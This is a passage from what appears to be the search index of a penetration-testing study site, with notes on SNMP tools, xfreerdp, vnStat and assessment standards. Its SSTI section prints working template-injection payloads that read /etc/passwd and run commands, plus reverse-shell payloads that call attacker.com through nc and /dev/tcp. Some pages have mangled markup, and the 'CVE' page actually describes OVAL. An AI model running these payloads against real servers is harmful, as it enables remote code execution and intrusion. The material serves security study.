Commands","text":"<ol> <li> <p>Single IP Scan:</p> <p>bash</p> <p>Copy code</p> <p><code>onesixtyone -c community.txt 192.168.1.1</code></p> <p>This command tests the IP <code>192.168.1.1</code> against the community strings listed in <code>community.txt</code>.</p> </li> <li> <p>IP Range Scan:</p> <p>bash</p> <p>Copy code</p> <p><code>onesixtyone -c community.txt -i ips.txt</code></p> <p>This command scans all IP addresses in <code>ips.txt</code>, attempting to authenticate with each listed community string.</p> </li> <li> <p>Verbose Mode:</p> <p>bash</p> <p>Copy code</p> <p><code>onesixtyone -v -c community.txt -i ips.txt</code></p> <p>Adding the <code>-v</code> flag enables verbose output, which can provide more detailed feedback about each attempt.</p> </li> </ol>"},{"location":"CPTS/Tools/onesixtyone/#advanced-usage","title":"Advanced Usage","text":""},{"location":"CPTS/Tools/onesixtyone/#port-and-timeout-options","title":"Port and Timeout Options","text":"<p>By default, onesixtyone scans SNMP on UDP port 161. However, these options are customizable:</p> <ul> <li> <p>Custom Port: Specify a non-standard SNMP port with the <code>-p</code> option.</p> <p>bash</p> <p>Copy code</p> <p><code>onesixtyone -p 1161 -c community.txt -i ips.txt</code></p> <p>This scans the SNMP service on port <code>1161</code> instead of the default <code>161</code>.</p> </li> <li> <p>Timeout Settings: Control the timeout duration for each request using <code>-t</code> (in milliseconds).</p> <p><code>bash onesixtyone -t 500 -c community.txt -i ips.txt</code></p> <p>This sets a 500 ms timeout per request.</p> </li> </ul>"},{"location":"CPTS/Tools/onesixtyone/#using-onesixtyone-with-nmap","title":"Using Onesixtyone with Nmap","text":"<p>To maximize efficiency, pair onesixtyone with Nmap to identify SNMP services before using onesixtyone to query them.</p> <ol> <li> <p>Identify SNMP-Enabled Devices with Nmap:</p> <p>bash</p> <p>Copy code</p> <p><code>nmap -sU -p 161 --open -oG snmp_hosts.txt 192.168.1.0/24</code></p> <p>This command scans the specified subnet for open UDP port 161 and saves results to <code>snmp_hosts.txt</code>.</p> </li> <li> <p>Filter and Feed Results to Onesixtyone: Use the results of Nmap to create an IP file and feed it to onesixtyone.</p> <p>bash</p> <p>Copy code</p> <p><code>grep 'open' snmp_hosts.txt | awk '{print $2}' &gt; open_ips.txt onesixtyone -c community.txt -i open_ips.txt</code></p> </li> </ol>"},{"location":"CPTS/Tools/onesixtyone/#interpreting-onesixtyone-results","title":"Interpreting Onesixtyone Results","text":"<p>After running onesixtyone, the output typically displays each IP and the corresponding SNMP system information if a valid community string is found. The information may include:</p> <ul> <li>System Description: Basic details about the operating system and device type.</li> <li>Uptime: Device uptime, which can help estimate system stability or determine if a device was recently rebooted.</li> <li>Contact Information: Administrator details (if configured).</li> <li>Location: Physical or logical location of the device.</li> </ul> <p>Example Output:</p> <p>plaintext</p> <p>Copy code</p> <p><code>192.168.1.1 [public] Linux 3.10.0-1160.15.2.el7.x86_64 192.168.1.2 [private] Cisco IOS Software, C880 Software</code></p>"},{"location":"CPTS/Tools/onesixtyone/#common-use-cases","title":"Common Use Cases","text":"<ol> <li>Identify Default or Weak Community Strings: Use common strings like \"public\" and \"private\" to detect devices using default SNMP settings.</li> <li>Network Mapping: Discover devices and basic details to create a network topology.</li> <li>Vulnerability Scanning: Find devices exposing sensitive information through misconfigured SNMP.</li> </ol>"},{"location":"CPTS/Tools/onesixtyone/#troubleshooting","title":"Troubleshooting","text":"<ul> <li>No Output or Timeout: Check that SNMP is enabled on the target device and accessible from your network.</li> <li>Connection Refused or Blocked: Ensure UDP port 161 is open on the target. Firewalls may block SNMP traffic.</li> <li>No Results: Try different community strings, as the target might not be using default values.</li> </ul>"},{"location":"CPTS/Tools/onesixtyone/#security-considerations","title":"Security Considerations","text":"<p>Since SNMPv1 and SNMPv2c lack encryption, any data, including community strings, is transmitted in plain text, making it vulnerable to interception. Using strong, unique community strings or migrating to SNMPv3 with authentication and encryption is recommended for security.</p>"},{"location":"CPTS/Tools/regsvr32/","title":"Regsvr32","text":""},{"location":"CPTS/Tools/regsvr32/#regsvr32","title":"Regsvr32","text":""},{"location":"CPTS/Tools/snmpwalk/","title":"snmpwalk","text":"<p>[!tip]- Tips Write tips here</p>"},{"location":"CPTS/Tools/snmpwalk/#references","title":"References","text":"<ul> <li>Layered Enumeration Framework Guide</li> <li>Comprehensive OSCP Enumeration Strategies</li> </ul>"},{"location":"CPTS/Tools/snmpwalk/#snmpwalk-cheat-sheet","title":"SNMPwalk Cheat Sheet","text":""},{"location":"CPTS/Tools/snmpwalk/#overview","title":"Overview","text":"<p>SNMPwalk is a command-line tool used to retrieve a sequence of SNMP objects from a target device. It sends an SNMP GETNEXT request to query information from an SNMP-enabled device, like routers, switches, servers, and IoT devices, over the network. SNMPwalk simplifies querying by automatically walking through the Management Information Base (MIB) tree to retrieve hierarchical data without needing to specify each Object Identifier (OID) individually.</p>"},{"location":"CPTS/Tools/snmpwalk/#common-snmp-versions-and-ports","title":"Common SNMP Versions and Ports","text":"<ul> <li>SNMPv1: Insecure, no encryption, uses community strings.</li> <li>SNMPv2c: Adds bulk requests but still lacks security.</li> <li>SNMPv3: Offers enhanced security with authentication and encryption.</li> </ul> <p>Default ports:</p> <ul> <li>UDP 161: General SNMP queries.</li> <li>UDP 162: SNMP traps.</li> </ul>"},{"location":"CPTS/Tools/snmpwalk/#basic-syntax","title":"Basic Syntax","text":"<p>The basic syntax of <code>snmpwalk</code> is as follows:</p> <p>bash</p> <p>Copy code</p> <p><code>snmpwalk -v &lt;version&gt; -c &lt;community_string&gt; &lt;target_ip&gt; &lt;oid&gt;</code></p> <ul> <li><code>-v &lt;version&gt;</code>: Specifies the SNMP version (e.g., 1, 2c, or 3).</li> <li><code>-c &lt;community_string&gt;</code>: Community string for SNMP versions 1 and 2c (e.g., \"public\").</li> <li><code>&lt;target_ip&gt;</code>: IP address or hostname of the SNMP-enabled device.</li> <li><code>&lt;oid&gt;</code>: The Object Identifier you want to walk. If left blank, the entire MIB tree is walked.</li> </ul> <p>Example:</p> <p>bash</p> <p>Copy code</p> <p><code>snmpwalk -v 2c -c public 192.168.1.1</code></p> <p>This command queries the entire MIB tree of the device at 192.168.1.1 using SNMPv2c with the community string \"public\".</p>"},{"location":"CPTS/Tools/snmpwalk/#commonly-used-snmp-oids","title":"Commonly Used SNMP OIDs","text":"<p>Some frequently used Object Identifiers (OIDs):</p> <ul> <li>System Information: <code>.1.3.6.1.2.1.1</code> (e.g., uptime, contact, location)</li> <li>Network Interfaces: <code>.1.3.6.1.2.1.2</code></li> <li>IP Address Table: <code>.1.3.6.1.2.1.4.20</code></li> <li>Routing Table: <code>.1.3.6.1.2.1.4.21</code></li> <li>ARP Table: <code>.1.3.6.1.2.1.4.22</code></li> <li>CPU Load: <code>.1.3.6.1.4.1.2021.10</code></li> <li>Memory Usage: <code>.1.3.6.1.4.1.2021.4</code></li> </ul> <p>Example:</p> <p>bash</p> <p>Copy code</p> <p><code>snmpwalk -v 2c -c public 192.168.1.1 1.3.6.1.2.1.1</code></p> <p>This command retrieves system information, including device uptime, system contact, and location.</p>"},{"location":"CPTS/Tools/snmpwalk/#using-snmpv3-for-enhanced-security","title":"Using SNMPv3 for Enhanced Security","text":"<p>For SNMPv3, use the following options:</p> <ul> <li><code>-u &lt;username&gt;</code>: Specifies the username.</li> <li><code>-l &lt;authLevel&gt;</code>: Sets the security level (noAuthNoPriv, authNoPriv, authPriv).</li> <li><code>-a &lt;authProtocol&gt;</code>: Authentication protocol (e.g., MD5 or SHA).</li> <li><code>-A &lt;authPassphrase&gt;</code>: Authentication passphrase.</li> <li><code>-x &lt;privProtocol&gt;</code>: Privacy protocol (e.g., DES or AES).</li> <li><code>-X &lt;privPassphrase&gt;</code>: Privacy passphrase.</li> </ul> <p>Example with Authentication and Privacy:</p> <p>bash</p> <p>Copy code</p> <p><code>snmpwalk -v 3 -u myUser -l authPriv -a SHA -A \"authPass\" -x AES -X \"privPass\" 192.168.1.1</code></p> <p>This command uses SNMPv3 with both authentication (SHA) and encryption (AES).</p>"},{"location":"CPTS/Tools/snmpwalk/#advanced-usage","title":"Advanced Usage","text":""},{"location":"CPTS/Tools/snmpwalk/#limiting-output-by-mib-tree-or-oid","title":"Limiting Output by MIB Tree or OID","text":"<p>Specify an OID to target a specific branch of the MIB tree, improving efficiency and readability. For example:</p> <p>bash</p> <p>Copy code</p> <p><code>snmpwalk -v 2c -c public 192.168.1.1 1.3.6.1.2.1.2</code></p> <p>This command retrieves only network interface information, rather than the entire MIB tree.</p>"},{"location":"CPTS/Tools/snmpwalk/#using-snmpwalk-with-output-filtering","title":"Using <code>snmpwalk</code> with Output Filtering","text":"<p>Use <code>grep</code> or <code>awk</code> to filter specific information. For example, to get only interface names and statuses:</p> <p>bash</p> <p>Copy code</p> <p><code>snmpwalk -v 2c -c public 192.168.1.1 1.3.6.1.2.1.2 | grep \"ifDescr\\|ifOperStatus\"</code></p> <p>This command outputs only the interface description and operational status.</p>"},{"location":"CPTS/Tools/snmpwalk/#setting-timeout-and-retries","title":"Setting Timeout and Retries","text":"<p>Use the <code>-t</code> (timeout) and <code>-r</code> (retries) options to handle latency or unreliable connections:</p> <p>bash</p> <p>Copy code</p> <p><code>snmpwalk -v 2c -c public -t 5 -r 3 192.168.1.1</code></p> <p>This command sets a 5-second timeout and 3 retries.</p>"},{"location":"CPTS/Tools/snmpwalk/#saving-output-to-a-file","title":"Saving Output to a File","text":"<p>To save the results to a file for analysis or reporting:</p> <p>bash</p> <p>Copy code</p> <p><code>snmpwalk -v 2c -c public 192.168.1.1 &gt; snmp_output.txt</code></p>"},{"location":"CPTS/Tools/snmpwalk/#common-errors-and-troubleshooting","title":"Common Errors and Troubleshooting","text":"<ul> <li>Timeout or No Response: Ensure the device allows SNMP requests from your IP. Check if SNMP is enabled and configured correctly on the device.</li> <li>Incorrect Community String: For SNMPv1 or SNMPv2, verify the correct community string (e.g., \"public\"). A wrong community string will cause \"Timeout\" errors.</li> <li>Authentication Issues with SNMPv3: Verify usernames, authentication protocols, and passphrases if using SNMPv3.</li> </ul>"},{"location":"CPTS/Tools/snmpwalk/#practical-applications","title":"Practical Applications","text":"<ol> <li>Device Inventory: Use <code>snmpwalk</code> to retrieve system descriptions, IP addresses, and other data, building an inventory of networked devices.</li> <li>Performance Monitoring: Monitor CPU, memory usage, and network interface traffic statistics.</li> <li>Fault Detection: Use SNMP traps to detect changes (e.g., link up/down, high CPU load) and automate alerts.</li> <li>Configuration Auditing: Pull configuration details for auditing purposes to ensure compliance with standards or to detect unauthorized changes.</li> </ol>"},{"location":"CPTS/Tools/ssti/","title":"A Pentester's Guide to Server-Side Template Injection (SSTI)","text":""},{"location":"CPTS/Tools/ssti/#what-is-ssti","title":"What is SSTI?","text":"<p>Server-side template injection (SSTI) is a vulnerability where an attacker injects malicious input into a template to execute commands on the server-side. This occurs when user input is embedded into the template engine without proper validation, potentially leading to remote code execution (RCE).</p>"},{"location":"CPTS/Tools/ssti/#common-template-engines","title":"Common Template Engines:","text":"<ul> <li>PHP \u2013 Smarty, Twig</li> <li>Java \u2013 Velocity, Freemaker</li> <li>Python \u2013 Jinja, Mako, Tornado</li> <li>JavaScript \u2013 Jade, Rage</li> <li>Ruby \u2013 Liquid</li> </ul>"},{"location":"CPTS/Tools/ssti/#how-does-it-work","title":"How Does It Work?","text":"<p>Consider the following vulnerable request:</p> <pre><code>POST /some-endpoint HTTP/1.1\nHost: vulnerable-website.com\nparameter=value\n</code></pre> <p>To test for SSTI, use a polyglot payload:</p> <pre><code>POST /some-endpoint HTTP/1.1\nHost: vulnerable-website.com\nparameter=${7*7}\n</code></pre> <p>If the response contains <code>49</code>, the application is likely vulnerable.</p>"},{"location":"CPTS/Tools/ssti/#impact-of-ssti","title":"Impact of SSTI","text":"<p>SSTI vulnerabilities are critical as they often lead to:</p> <ul> <li>Remote Code Execution (RCE)</li> <li>Access to sensitive data</li> <li>Server compromise</li> </ul>"},{"location":"CPTS/Tools/ssti/#how-to-identify-the-vulnerability","title":"How To Identify the Vulnerability?","text":"<p>Use a polyglot payload containing special characters to test for SSTI:</p> <pre><code>${{&lt;%[%'\"}}%\n</code></pre> <p>If the server returns an error message or exception, it may indicate a vulnerability. Follow these steps:</p> <ol> <li>Detect template injection.</li> <li>Identify the template engine.</li> <li>Consult the manual for specific exploitation techniques.</li> <li>Exploit the vulnerability.</li> </ol>"},{"location":"CPTS/Tools/ssti/#cheat-sheet-for-identifying-template-engines","title":"Cheat Sheet for Identifying Template Engines","text":"Template Engine Test Payload Jinja2 (Python) <code>{{7*7}}</code> Twig (PHP) <code>{{7*7}}</code> Velocity (Java) <code>#set($x=7*7)$x</code> Mako (Python) <code>${7*7}</code> Smarty (PHP) <code>{$7*7}</code> Jade/Pug (JS) <code>#{7*7}</code>"},{"location":"CPTS/Tools/ssti/#exploitation-techniques","title":"Exploitation Techniques","text":"<p>Once an SSTI vulnerability is confirmed, further exploitation can include:</p> <ul> <li>Reading Files: <code>{{self.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}</code></li> <li>Command Execution: <code>{{config.__class__.__init__.__globals__['os'].popen('id').read()}}</code></li> <li>Retrieving Environment Variables: <code>{{config.items()}}</code></li> </ul>"},{"location":"CPTS/Tools/ssti/#reverse-shell-payloads","title":"Reverse Shell Payloads","text":""},{"location":"CPTS/Tools/ssti/#python","title":"Python","text":"<pre><code>{{ self.__init__.__globals__['os'].popen('nc -e /bin/sh attacker.com 4444').read() }}\n</code></pre>"},{"location":"CPTS/Tools/ssti/#bash","title":"Bash","text":"<pre><code>{{ self.__init__.__globals__['os'].popen('bash -i &gt;&amp; /dev/tcp/attacker.com/4444 0&gt;&amp;1').read() }}\n</code></pre>"},{"location":"CPTS/Tools/ssti/#php","title":"PHP","text":"<pre><code>{{ passthru(\"nc -e /bin/sh attacker.com 4444\") }}\n</code></pre>"},{"location":"CPTS/Tools/ssti/#automated-tools","title":"Automated Tools","text":"<p>Tplmap is a tool designed for automating SSTI exploitation, including:</p> <ul> <li>Sandbox escape techniques</li> <li>RCE payload generation</li> <li>Template engine detection</li> </ul> <p>GitHub Repository for Tplmap</p>"},{"location":"CPTS/Tools/ssti/#advanced-commands-tricks","title":"Advanced Commands &amp; Tricks","text":""},{"location":"CPTS/Tools/ssti/#checking-for-error-messages","title":"Checking for Error Messages:","text":"<pre><code>curl -X POST -d 'parameter={{7*7}}' http://target.com/some-endpoint\n</code></pre>"},{"location":"CPTS/Tools/ssti/#extracting-system-information","title":"Extracting System Information:","text":"<pre><code>{{ self.__init__.__globals__['os'].popen('uname -a').read() }}\n</code></pre>"},{"location":"CPTS/Tools/ssti/#listing-files-in-directory","title":"Listing Files in Directory:","text":"<pre><code>{{ self.__init__.__globals__['os'].popen('ls -la').read() }}\n</code></pre>"},{"location":"CPTS/Tools/ssti/#gaining-interactive-shell","title":"Gaining Interactive Shell:","text":"<pre><code>{{ self.__init__.__globals__['os'].popen('python3 -c \"import pty; pty.spawn('/bin/bash')\"').read() }}\n</code></pre>"},{"location":"CPTS/Tools/ssti/#remediation","title":"Remediation","text":""},{"location":"CPTS/Tools/ssti/#1-input-sanitization","title":"1. Input Sanitization","text":"<ul> <li>Filter user input before passing it into the template engine.</li> <li>Use allowlists for expected input values.</li> </ul>"},{"location":"CPTS/Tools/ssti/#2-sandboxing","title":"2. Sandboxing","text":"<ul> <li>Restrict execution environments using secure sandboxes.</li> <li>Disable risky template functions where possible.</li> </ul> <p>By following these best practices, you can prevent SSTI vulnerabilities and protect web applications from critical security risks.</p>"},{"location":"CPTS/Tools/vnStat/","title":"vnStat","text":"<p>[!tip]- Tips Write tips here</p>"},{"location":"CPTS/Tools/vnStat/#references","title":"References","text":"<ul> <li>Layered Enumeration Framework Guide</li> <li>Comprehensive OSCP Enumeration Strategies</li> </ul>"},{"location":"CPTS/Tools/vnStat/#what-is-vnstat","title":"What is vnStat?","text":"<p>vnStat is a lightweight, command-line network traffic monitoring tool. It is designed to provide detailed information about network usage and bandwidth consumption over time. Unlike other network monitoring tools, vnStat focuses on minimal resource usage by reading directly from network interface statistics provided by the operating system, rather than capturing and analyzing packets.</p>"},{"location":"CPTS/Tools/vnStat/#key-features","title":"Key Features","text":"<ol> <li> <p>Low Resource Usage:</p> <ul> <li>Does not require superuser privileges after installation.</li> <li>Reads data from <code>/proc/net/dev</code> (Linux) instead of intercepting network traffic.</li> <li> <p>Traffic Statistics:</p> </li> <li> <p>Tracks incoming and outgoing traffic for specified network interfaces.</p> </li> <li>Displays usage by hours, days, months, or a specified time period.</li> <li> <p>Customizable:</p> </li> <li> <p>Allows users to monitor specific interfaces (e.g., <code>eth0</code>, <code>wlan0</code>).</p> </li> <li>Supports exporting reports in various formats.</li> <li> <p>Persistent Data:</p> </li> <li> <p>Stores usage statistics in a database for long-term tracking, surviving reboots.</p> </li> <li> <p>Compatibility:</p> </li> <li> <p>Works on various Unix-based systems like Linux and BSD.</p> </li> </ul> </li> </ol>"},{"location":"CPTS/Tools/vnStat/#use-cases","title":"Use Cases","text":"<ol> <li> <p>Bandwidth Monitoring:</p> <ul> <li>Ideal for tracking network usage over time to avoid exceeding data limits.</li> <li> <p>Troubleshooting:</p> </li> <li> <p>Helps identify high bandwidth consumption periods or interfaces.</p> </li> <li> <p>Reporting:</p> </li> <li> <p>Provides usage summaries for IT teams or personal monitoring.</p> </li> </ul> </li> </ol>"},{"location":"CPTS/Tools/vnStat/#basic-commands","title":"Basic Commands","text":"<ol> <li> <p>View Daily Traffic:</p> <p>bash</p> <p>Copy code</p> <p><code>vnstat -d</code></p> </li> <li> <p>View Monthly Traffic:</p> <p>bash</p> <p>Copy code</p> <p><code>vnstat -m</code></p> </li> <li> <p>View Hourly Traffic:</p> <p>bash</p> <p>Copy code</p> <p><code>vnstat -h</code></p> </li> <li> <p>Live Traffic Monitoring:</p> <p>bash</p> <p>Copy code</p> <p><code>vnstat -l</code></p> </li> <li> <p>Network Interface Summary:</p> <p>bash</p> <p>Copy code</p> <p><code>vnstat</code></p> </li> </ol>"},{"location":"CPTS/Tools/vnStat/#installation","title":"Installation","text":"<ol> <li> <p>On Debian/Ubuntu-based systems:</p> <p>bash</p> <p>Copy code</p> <p><code>sudo apt install vnstat</code></p> </li> <li> <p>On Red Hat-based systems:</p> <p>bash</p> <p>Copy code</p> <p><code>sudo yum install vnstat</code></p> </li> <li> <p>Start the vnStat service:</p> <p>bash</p> <p>Copy code</p> <p><code>sudo systemctl start vnstat sudo systemctl enable vnstat</code></p> </li> </ol>"},{"location":"CPTS/Tools/vnStat/#configuration","title":"Configuration","text":"<ul> <li> <p>The configuration file is typically located at:</p> <p>bash</p> <p>Copy code</p> <p><code>/etc/vnstat.conf</code></p> </li> <li> <p>You can customize:</p> <ul> <li>Monitored interfaces.</li> <li>Data retention policies.</li> <li>Output formatting options.</li> </ul> </li> </ul>"},{"location":"CPTS/Tools/vnStat/#why-use-vnstat","title":"Why Use vnStat?","text":"<ul> <li>Minimal impact on system performance.</li> <li>No need for deep packet inspection.</li> <li>Easy setup and long-term traffic tracking for accurate insights.</li> </ul>"},{"location":"CPTS/Tools/xfreerdp/","title":"Xfreerdp","text":"<p><code>xfreerdp</code> is an open-source command-line tool for connecting to remote desktop sessions using the Remote Desktop Protocol (RDP), developed as part of the FreeRDP project. It is commonly used in Linux environments to establish connections to Windows machines or servers configured for remote desktop access.</p>"},{"location":"CPTS/Tools/xfreerdp/#installation","title":"Installation","text":"<pre><code>    sudo apt install freerdp2-x11\n</code></pre>"},{"location":"CPTS/Tools/xfreerdp/#key-features-of-xfreerdp","title":"Key Features of <code>xfreerdp</code>","text":"<ol> <li>RDP Protocol Support: Fully supports the RDP protocol for remote desktop connections.</li> <li>Cross-Platform: While it is primarily used on Linux, it can also run on other platforms.</li> <li>Customizability: Offers a wide range of options and flags for connection customization.</li> <li>Security: Supports modern RDP security features, including TLS, NLA (Network Level Authentication), and SSL encryption.</li> <li>Performance Optimization: Allows configuration of bandwidth usage, compression, and graphics settings to optimize performance.</li> <li>Clipboard and File Sharing: Supports clipboard redirection and file sharing between the local and remote systems.</li> <li>Multimedia Redirection: Includes support for audio and video redirection during the session.</li> </ol>"},{"location":"CPTS/Tools/xfreerdp/#basic-syntax","title":"Basic Syntax","text":"<p><code>xfreerdp [options] &lt;server&gt;</code></p>"},{"location":"CPTS/Tools/xfreerdp/#common-options","title":"Common Options","text":"Option Description <code>/u:&lt;username&gt;</code> Specify the username for authentication. <code>/p:&lt;password&gt;</code> Specify the password for authentication. <code>/v:&lt;hostname&gt;</code> Specify the remote host or server address. <code>/port:&lt;port&gt;</code> Specify a custom port (default is 3389 for RDP). <code>/cert-ignore</code> Ignore certificate warnings (useful for self-signed certificates). <code>/dynamic-resolution</code> Dynamically adjust the resolution of the remote desktop session based on the local window size. <code>/f</code> Enable full-screen mode. <code>/bpp:&lt;depth&gt;</code> Specify color depth (e.g., 16, 24, or 32 bits per pixel). <code>/sound</code> Enable audio redirection from the remote system. <code>/clipboard</code> Enable clipboard redirection. <code>/drive:&lt;name&gt;,&lt;path&gt;</code> Share a local directory or drive with the remote system."},{"location":"CPTS/Tools/xfreerdp/#examples","title":"Examples","text":"<ol> <li> <p>Basic Connection     ```bash xfreerdp /u:Administrator /p:password /v:192.168.1.10 <pre><code>    Connect to a remote server at `192.168.1.10` with the username `Administrator` and password `password`.\n\n2. **Full-Screen Connection**\n\n    ```bash\nxfreerdp /u:admin /p:12345 /v:192.168.1.20 /f\n</code></pre></p> <p>Open an RDP session to <code>192.168.1.20</code> in full-screen mode.</p> </li> <li> <p>Connection with Clipboard and Audio Redirection     ```bash xfreerdp /u:user /p:password /v:remote.server.com /clipboard /sound <pre><code>    Establish a connection to `remote.server.com` with clipboard and audio redirection enabled.\n\n4. **Ignore Certificate Warnings**\n\n    ```bash\nxfreerdp /u:user /p:password /v:192.168.1.15 /cert-ignore\n</code></pre></p> <p>Connect to a remote server and ignore certificate warnings.</p> </li> <li> <p>Sharing a Local Directory     ```bash xfreerdp /u:user /p:password /v:server.example.com /drive:shared,/home/user/shared <pre><code>    Share the local directory `/home/user/shared` with the remote system.\n\n6. **Dynamic Resolution Adjustment**\n    ```bash\nxfreerdp /u:user /p:password /v:192.168.1.25 /dynamic-resolution\n</code></pre></p> <p>Automatically adjust the remote session's resolution as the local window is resized.</p> </li> </ol>"},{"location":"CPTS/Tools/xfreerdp/#advanced-use-cases","title":"Advanced Use Cases","text":"<ol> <li> <p>Network Optimization</p> <ul> <li>Use <code>/network:lan</code>, <code>/network:broadband</code>, or <code>/network:wan</code> to optimize performance based on the connection type.</li> </ul> <p>Example:</p> <p>bash</p> <p>Copy code</p> <p><code>xfreerdp /u:user /p:password /v:server /network:wan</code></p> </li> <li> <p>Multimonitor Support</p> <ul> <li>Enable multiple monitors for the session:</li> </ul> </li> </ol> <pre><code>xfreerdp /u:user /p:password /v:server /multimon\n</code></pre> <ol> <li> <p>Connection to RemoteApp</p> <ul> <li> <p>Launch a specific application on the remote server instead of the full desktop session:</p> <p>bash</p> <p>Copy code</p> <p>```bash xfreerdp /u:user /p:password /v:server /app:\"||notepad\" <pre><code>4. **Using Smart Cards**\n\n    - Redirect a smart card device to the remote server:\n\n        ```bash\nxfreerdp /u:user /p:password /v:server /smartcard\n</code></pre></p> </li> </ul> </li> <li> <p>Recording Sessions</p> <ul> <li>Capture the remote session display:</li> </ul> </li> </ol> <pre><code>        xfreerdp /u:user /p:password /v:server /video:record,/path/to/output.mp4\n</code></pre>"},{"location":"CPTS/Tools/xfreerdp/#troubleshooting","title":"Troubleshooting","text":"<ol> <li> <p>Common Errors:</p> <ul> <li>Certificate Error: Use <code>/cert-ignore</code> if encountering self-signed certificate warnings.</li> <li>Authentication Issues: Ensure NLA is supported on the server and use correct credentials.</li> <li>Firewall Blocking: Verify that the server allows connections on the specified port (default: 3389).</li> <li> <p>Verbose Output:</p> </li> <li> <p>Add <code>/log-level:DEBUG</code> to enable detailed output for troubleshooting:</p> <p><code>bash xfreerdp /u:user /p:password /v:server /log-level:DEBUG</code></p> </li> </ul> </li> </ol>"},{"location":"CPTS/Tools/xfreerdp/#security-considerations","title":"Security Considerations","text":"<ol> <li>Encrypted Connections: Ensure the server uses TLS/SSL to secure the session.</li> <li>Restrict Access: Limit RDP access to trusted IPs using firewalls or network security groups.</li> <li>Use Strong Passwords: Protect against brute-force attacks by using strong credentials.</li> </ol> <p><code>xfreerdp</code> is a versatile and powerful tool for managing remote desktop connections, making it a valuable resource for system administrators and security professionals.</p>"},{"location":"CPTS/Vulnerability/Assessment%20Standards/","title":"Assessment Standards","text":"<p>[!tip]- Tips Write tips here</p>"},{"location":"CPTS/Vulnerability/Assessment%20Standards/#references","title":"References","text":"<ul> <li>Layered Enumeration Framework Guide</li> <li>Comprehensive OSCP Enumeration Strategies</li> </ul> <p>![[Pasted image 20241211232920.png]]#### Health Insurance Portability and Accountability Act (HIPAA)</p> <p><code>HIPAA</code>\u00a0is the\u00a0Health Insurance Portability and Accountability Act, which is used to protect patients' data. HIPAA does not necessarily require vulnerability scans or assessments; however, a risk assessment and vulnerability identification are required to maintain HIPAA accreditation.</p>"},{"location":"CPTS/Vulnerability/Assessment%20Standards/#federal-information-security-management-act-fisma","title":"Federal Information Security Management Act (FISMA)","text":"<p>The\u00a0Federal Information Security Management Act (FISMA)\u00a0is a set of standards and guidelines used to safeguard government operations and information. The act requires an organization to provide documentation and proof of a vulnerability management program to maintain information technology systems' proper availability, confidentiality, and integrity.</p>"},{"location":"CPTS/Vulnerability/Assessment%20Standards/#iso-27001","title":"ISO 27001","text":"<p><code>ISO 27001</code>\u00a0is a standard used worldwide to manage information security.\u00a0ISO 27001\u00a0requires organizations to perform quarterly external and internal scans.</p> <p>Although compliance is essential, it should not drive a vulnerability management program. Vulnerability management should consider the uniqueness of an environment and the associated risk appetite to an organization.</p> <p>The\u00a0<code>International Organization for Standardization</code>\u00a0(<code>ISO</code>) maintains technical standards for pretty much anything you can imagine. The\u00a0ISO 27001\u00a0standard deals with information security. ISO 27001 compliance depends upon maintaining an effective Information Security Management System. To ensure compliance, organizations can perform penetration tests in a carefully designed way.</p>"},{"location":"CPTS/Vulnerability/Assessment%20Standards/#penetration-testing-standards","title":"Penetration Testing Standards","text":"<p>Penetration tests should not be performed without any\u00a0<code>rules</code>\u00a0or\u00a0<code>guidelines</code>. There must always be a specifically defined scope for a pentest, and the owner of a network must have a\u00a0<code>signed legal contract</code>\u00a0with pentesters outlining what they're allowed to do and what they're not allowed to do. Pentesting should also be conducted in such a way that minimal harm is done to a company's computers and networks. Penetration testers should avoid making changes wherever possible (such as changing an account password) and limit the amount of data removed from a client's network. For example, instead of removing sensitive documents from a file share, a screenshot of the folder names should suffice to prove the risk.</p> <p>In addition to scope and legalities, there are also various pentesting standards, depending on what kind of computer system is being assessed. Here are some of the more common standards you may use as a pentester.</p>"},{"location":"CPTS/Vulnerability/Assessment%20Standards/#ptes","title":"PTES","text":"<p>The\u00a0Penetration Testing Execution Standard\u00a0(<code>PTES</code>) can be applied to all types of penetration tests. It outlines the phases of a penetration test and how they should be conducted. These are the sections in the PTES:</p> <ul> <li>Pre-engagement Interactions</li> <li>Intelligence Gathering</li> <li>Threat Modeling</li> <li>Vulnerability Analysis</li> <li>Exploitation</li> <li>Post Exploitation</li> <li>Reporting</li> </ul>"},{"location":"CPTS/Vulnerability/Assessment%20Standards/#osstmm","title":"OSSTMM","text":"<p><code>OSSTMM</code>\u00a0is the\u00a0<code>Open Source Security Testing Methodology Manual</code>, another set of guidelines pentesters can use to ensure they're doing their jobs properly. It can be used alongside other pentest standards.</p> <p>OSSTMM\u00a0is divided into five different channels for five different areas of pentesting:</p> <ol> <li>Human Security (human beings are subject to social engineering exploits)</li> <li>Physical Security</li> <li>Wireless Communications (including but not limited to technologies like WiFi and Bluetooth)</li> <li>Telecommunications</li> <li>Data Networks</li> </ol>"},{"location":"CPTS/Vulnerability/Assessment%20Standards/#nist","title":"NIST","text":"<p>The\u00a0<code>NIST</code>\u00a0(<code>National Institute of Standards and Technology</code>) is well known for their\u00a0NIST Cybersecurity Framework, a system for designing incident response policies and procedures. NIST also has a Penetration Testing Framework. The phases of the NIST framework include:</p> <ul> <li>Planning</li> <li>Discovery</li> <li>Attack</li> <li>Reporting</li> </ul>"},{"location":"CPTS/Vulnerability/Assessment%20Standards/#owasp","title":"OWASP","text":"<p><code>OWASP</code>\u00a0stands for the\u00a0Open Web Application Security Project. They're typically the go-to organization for defining testing standards and classifying risks to web applications.</p> <p>OWASP maintains a few different standards and helpful guides for assessing various technologies:</p> <ul> <li>Web Security Testing Guide (WSTG)</li> <li>Mobile Security Testing Guide (MSTG)</li> <li>Firmware Security Testing Methodology</li> </ul>"},{"location":"CPTS/Vulnerability/Common%20Vulnerabilities%20and%20Exposures%20%28CVE%29/","title":"Common Vulnerabilities and Exposures (CVE)","text":""},{"location":"CPTS/Vulnerability/Common%20Vulnerabilities%20and%20Exposures%20%28CVE%29/#overview","title":"Overview","text":"<ol> <li> <p>Definition:</p> <ul> <li>OVAL is an international standard for assessing and detailing the security state of systems.</li> <li>Publicly available and widely used in the information security community.</li> <li> <p>Purpose:</p> </li> <li> <p>Encodes system attributes for analysis.</p> </li> <li>Enables sharing of vulnerability definitions and findings across the security community.</li> </ul> </li> </ol>"},{"location":"CPTS/Vulnerability/Common%20Vulnerabilities%20and%20Exposures%20%28CVE%29/#key-features","title":"Key Features","text":"<ol> <li> <p>Support:</p> <ul> <li>Co-supported by the U.S. Department of Homeland Security's Office of Cybersecurity and Communications.</li> <li>Used in NIST\u2019s Security Content Automation Protocol (SCAP) for automating vulnerability management.</li> <li> <p>Repository:</p> </li> <li> <p>Contains 7,000+ definitions for vulnerabilities, configurations, and compliance checks.</p> </li> <li>Freely 